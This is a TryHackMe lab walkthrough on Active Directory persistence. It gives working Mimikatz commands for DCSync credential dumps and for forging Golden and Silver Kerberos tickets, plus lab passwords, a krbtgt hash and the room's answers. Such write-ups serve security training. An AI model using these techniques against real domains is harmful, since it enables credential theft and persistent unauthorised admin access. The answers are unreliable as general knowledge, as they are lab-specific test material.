![image](https://github.com/user-attachments/assets/6d5aa736-4542-468d-bd56-1fc0cfa9b113)
# Persisting Active Directory
Learn about common Active Directory persistence techniques that can be used post-compromise to ensure the blue team will not be able to kick you out during a red team exercise.


TryHackMe room [link](https://tryhackme.com/room/persistingad)


<br>

## Task 1 : Introduction


This room is focusing on Active Directory (AD)  persistence techniques to maintain access even if credentials are rotated. The goal is to learn how to deploy 
persistence methods in AD, including:

  - AD Credentials & DCSync
  - Silver & Golden Tickets
  - AD Certificates
  - Security Identifiers (SIDs)
  - Access Control Lists (ACLs)
  - Group Policy Objects (GPOs)


<br>

First we need to setup the environment..

### 1. Connect to the Network

- If using the AttackBox (web-based):
  - It auto-connects to the network.
![image](https://github.com/user-attachments/assets/6f613807-b675-4a62-a689-8037bc5a41c3)
  - Verify connectivity by pinging THMDC.za.tryhackme.loc.
  - Configure DNS:

        sed -i '1s|^|nameserver 10.200.62.100\n|' /etc/resolv-dnsmasq

    (Replace <THMDC_IP> with the DC's IP from the network diagram.)
  ![image](https://github.com/user-attachments/assets/8422cd53-f7a2-4ff6-811b-b6e57f918be7)

  
  - Test DNS:

        nslookup thmdc.za.tryhackme.loc
    Should resolve to the DC's IP.

- If using your own machine (OpenVPN):
  - Download the .ovpn file from the room's access page.

![image](https://github.com/user-attachments/assets/7ddd7257-2a88-4f79-ba7d-ba4a037bf6c5)
    After succesfull connection, we can verify there..

  - Connect using:

        sudo openvpn persistingad.ovpn

![image](https://github.com/user-attachments/assets/f67dc148-09b1-4201-9c8e-00f0af65ad38)
  
Configure DNS as above at AttackBox.



### 2. Get Initial Credentials
  - Visit:

        http://distributor.za.tryhackme.loc/creds
   
  - Click `Get Credentials` to receive a username & password.

These credentials allow access to `THMWRK1.za.tryhackme.loc` (a jump host).

![image](https://github.com/user-attachments/assets/cdb24921-3c96-410d-8bc6-b5d8260040e2)


### 3. Access the Jump Host

> Via RDP (Remote Desktop):

  - Use RDP client for gui remote access.
  
          xfreerdp3 /v:thmdc.za.tryhackme.loc /u:tony.wilson /p:Corpus2002 /cert:ignore


> Via SSH (Faster):

  - Use SSH for cli remote access.
    
        ssh tony.wilson@za.tryhackme.loc@thmdc.za.tryhackme.loc

![image](https://github.com/user-attachments/assets/36a08160-505c-4df6-8aac-f4f2ce3888df)


<br>


## Task 2 : Persistence through Credentials

**Objective:**
  We will use Mimikatz to perform a DCSync attack and extract credentials (including NTLM hashes) from the domain controller.



### 1. Connect to THMWRK1 (Jump Host)
- Use SSH with the provided Domain Administrator (DA) credentials:

      ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc

    **Password:** `tryhackmewouldnotguess1@`

### 2. Launch Mimikatz
- Navigate to the `Mimikatz` directory and execute it:

      C:\Tools\mimikatz_trunk\x64\mimikatz.exe

![image](https://github.com/user-attachments/assets/e3425bee-0e72-4735-b84b-b3cc61d5aea2)

  
### 3. Perform a DCSync Attack
- For a single user (e.g., `tony.wilson`):

      lsadump::dcsync /domain:za.tryhackme.loc /user:tony.wilson

This extracts the NTLM hash and other details for the user test.

![image](https://github.com/user-attachments/assets/63b72f62-6e09-4b85-b55e-276f5bc968ca)


- For ALL users (full credential dump):

      log tony.wilson_dcdump.txt
      lsadump::dcsync /domain:za.tryhackme.loc /all
    
Replace username with your assigned username.
![image](https://github.com/user-attachments/assets/0e11595c-5b37-451d-b5ab-73240b8ce1a6)

After completion, exit Mimikatz (exit) to save the log.

### 4. Analyze the Dump
- Extract all usernames:

      cat tony.wilson_dcdump.txt | find "SAM Username"

- Extract all NTLM hashes:

      cat tony.wilson_dcdump.txt | find "Hash NTLM"

Look for the `krbtgt` user’s hash (used for Golden Ticket attacks).


<br>
## _Answers_

What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

      lsadump::dcsync /domain:za.tryhackme.loc /user:test
      
What is the NTLM hash associated with the krbtgt user?

    16f9af38fca3ada405386b3b57366082
<br>


## Task 3 : Persistence through Tickets
In this task we will forge Golden Tickets (TGTs) and Silver Tickets (TGSs) for persistence in Active Directory.



### 1. Kerberos Authentication Flow
- `AS-REQ` → User requests a TGT (encrypted with their `NTLM` hash).
- `TGT` → Signed by the KRBTGT account’s hash (stored on the `DC`).
- `TGS-REQ` → User requests a TGS for a service (e.g., `CIFS` for file access).
- `TGS` → Encrypted with the service’s NTLM hash (e.g., a machine account).

### 2. Golden Tickets (Forged TGTs)
- What? A fake TGT signed by the KRBTGT hash.
- Why? Bypasses authentication, grants domain-wide admin access.

- Requirements:
    - KRBTGT NTLM hash (from `DCSync`).
    - Domain SID (`S-1-5-21-...`).
    - User RID (e.g., `500` for Administrator).

- Features:
    - Valid for 10 years by default (`Mimikatz`).
    - Works even for deleted/non-existent users.
    - Bypasses smart card authentication.

### 3. Silver Tickets (Forged TGSs)
- What? A fake TGS signed by a machine account’s hash.
- Why? Grants local admin access to a specific host (e.g., `THMSERVER1`).
- Requirements:
    - Machine account’s NTLM hash (e.g., `THMSERVER1$`).
    - Domain SID.
- Features:
    - Harder to detect (no DC interaction).
    - Scope limited to one service (e.g., `CIFS` for file access).


> Workflow...

### 1. Gather Required Data
- KRBTGT Hash: From DCSync (lsadump::dcsync /user:krbtgt).
- Domain SID:

      Get-ADDomain | Select-Object DomainSID

Machine Account Hash: From DCSync (e.g., THMSERVER1$).

### 2. Generate a Golden Ticket

    kerberos::golden /admin:FakeAdmin /domain:za.tryhackme.loc /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /endin:600 /renewmax:10080 /ptt
    
Flags:

  - `/ptt`: Injects ticket into memory.
  - `/endin`: Lifetime (default 10 hours).
  - `/renewmax`: Max renewal (default 7 days).

3. Verify Golden Ticket

        dir \\thmdc.za.tryhackme.loc\c$\

4. Generate a Silver Ticket

        kerberos::golden /admin:FakeUser /domain:za.tryhackme.loc /id:500 /sid:<DOMAIN_SID>/target:THMSERVER1.za.tryhackme.loc /rc4:<MACHINE_ACCOUNT_HASH> /service:cifs /ptt

Flags:
    - `/service:cifs`: Targets file sharing.
    - `/rc4`: Machine account’s NTLM hash.

5. Verify Silver Ticket

        dir \\thmserver1.za.tryhackme.loc\c$\

<br>
## _Answers_

Which AD account's NTLM hash is used to sign Kerberos tickets?

      krbtgt

What is the name of a ticket that impersonates a legitimate TGT?

      Golden ticket

What is the name of a ticket that impersonates a legitimate TGS?

      Silver ticket

What is the default lifetime (in years) of a golden ticket generated by Mimikatz?
      
      10
  

<br>  




